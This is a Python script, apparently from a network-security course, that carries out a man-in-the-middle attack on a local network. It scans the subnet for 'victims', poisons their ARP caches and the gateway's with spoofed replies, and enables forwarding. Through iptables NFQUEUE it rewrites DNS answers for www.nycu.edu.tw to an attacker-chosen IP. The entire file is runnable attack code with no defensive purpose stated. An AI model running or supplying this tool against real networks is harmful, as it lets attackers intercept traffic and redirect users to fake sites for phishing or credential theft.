#!/usr/bin/env python3

import os
import time
import threading
import netifaces as ni
import scapy.all as scapy

from math import log2
from netfilterqueue import NetfilterQueue


def start_command():
	queue_num = 0
	os.system('iptables --flush')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 	# enable IP fowarding
	os.system('iptables -I FORWARD -j NFQUEUE --queue-num %d' % queue_num)


def end_command():
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward') 	# disable IP fowarding
	os.system('iptables --flush')


def get_device_info():
	attacker_ip  = scapy.get_if_addr(scapy.conf.iface) 		# default interface
	attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface) 	# default interface   
	
	gateway = ni.gateways()['default'][ni.AF_INET]
	af_inet = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
	cidr    = 32 - sum([int(log2(256 - int(num))) for num in af_inet['netmask'].split('.')])

	gateway_ip = gateway[0]
	target_domain = gateway_ip + '/' + str(cidr)
	answered, unanswered = scapy.arping(target_domain, verbose=False)
    
	victims = list()
	print('Available devices')
	print('+-----------------+-------------------+')
	print('|   IP Address    |    MAC Address    |')
	print('+-----------------+-------------------+')
	for sent, recv in answered:
		if (recv.psrc != gateway_ip):
			victims.append({'ip': recv.psrc, 'mac': recv.hwsrc})
			print(f'| {recv.psrc:<15s} | {recv.hwsrc:<17s} |')
		else:
			gateway_mac = recv.hwsrc
	print('+-----------------+-------------------+')

	return attacker_ip, attacker_mac, gateway_ip, gateway_mac, victims


def send_arp_spoof_packet(send_ip, recv_ip, recv_mac):
	packet = scapy.ARP(op="is-at", psrc=send_ip, pdst=recv_ip, hwdst=recv_mac) # op=2 --> is-at
	scapy.send(packet, verbose=False)


def restore_arp_spoof_packet(src_ip, src_mac, recv_ip, recv_mac):
	packet = scapy.ARP(op="is-at", psrc=src_ip, hwsrc=src_mac, pdst=recv_ip, hwdst=recv_mac)
	scapy.send(packet, verbose=False)


def arp_spoofing(gateway_ip, gateway_mac, victims, terminate):
	while True:
		for victim in victims:
			# send arp packet to victim
			send_arp_spoof_packet(
				send_ip=gateway_ip, recv_ip=victim['ip'], recv_mac=victim['mac']
			)
			# send arp packet to gateway
			send_arp_spoof_packet(
				send_ip=victim['ip'], recv_ip=gateway_ip, recv_mac=gateway_mac
			)
		time.sleep(1)                                          
		if terminate.is_set():
			for victim in victims:
				restore_arp_spoof_packet(
					src_ip=gateway_ip, src_mac=gateway_mac, 
					recv_ip=victim['ip'], recv_mac=victim['mac']
				)
				restore_arp_spoof_packet(
					src_ip=victim['ip'], src_mac=victim['mac'], 
					recv_ip=gateway_ip, recv_mac=gateway_mac
				)   
			break


def modify_packet(pkt):
	domain_name = b'www.nycu.edu.tw'
	redirect_ip = '140.113.207.241'

	scapy_pkt = scapy.IP(pkt.get_payload()) 	# convert the packet into scapy packet
	
	if scapy_pkt.haslayer(scapy.DNSRR): 		# DNS Resource Record
		qname = scapy_pkt[scapy.DNSQR].qname  	# extract the domain name

		if domain_name in qname:
			fake_answer	= scapy.DNSRR(rrname=qname, rdata=redirect_ip)
			scapy_pkt[scapy.DNS].an = fake_answer
			scapy_pkt[scapy.DNS].ancount = 1

			del scapy_pkt[scapy.IP].len
			del scapy_pkt[scapy.IP].chksum
			del scapy_pkt[scapy.UDP].len
			del scapy_pkt[scapy.UDP].chksum

			pkt.set_payload(bytes(scapy_pkt))

	pkt.accept()


def pharming_attack(thread, terminate):
	print("\nStart pharming ...")
	nfqueue = NetfilterQueue()
	try:
		nfqueue.bind(0, modify_packet)
		nfqueue.run()
	except KeyboardInterrupt:
		print("\nDetected CTRL + C pressed and Exiting ...")
		terminate.set()
		thread.join()
		nfqueue.unbind()
		end_command()
		print("Stop pharming")


def main():
	if os.geteuid() != 0:
		exit(f'{__file__}: Permission denied')
	
	start_command()
	attacker_ip, attacker_mac, gateway_ip, gateway_mac, victims = get_device_info()

	terminate  = threading.Event()
	arp_thread = threading.Thread(
		target=arp_spoofing, 
		args=(gateway_ip, gateway_mac, victims, terminate), 
		daemon=True
	)
	arp_thread.start()
	pharming_attack(arp_thread, terminate)


if __name__ == '__main__':
	main()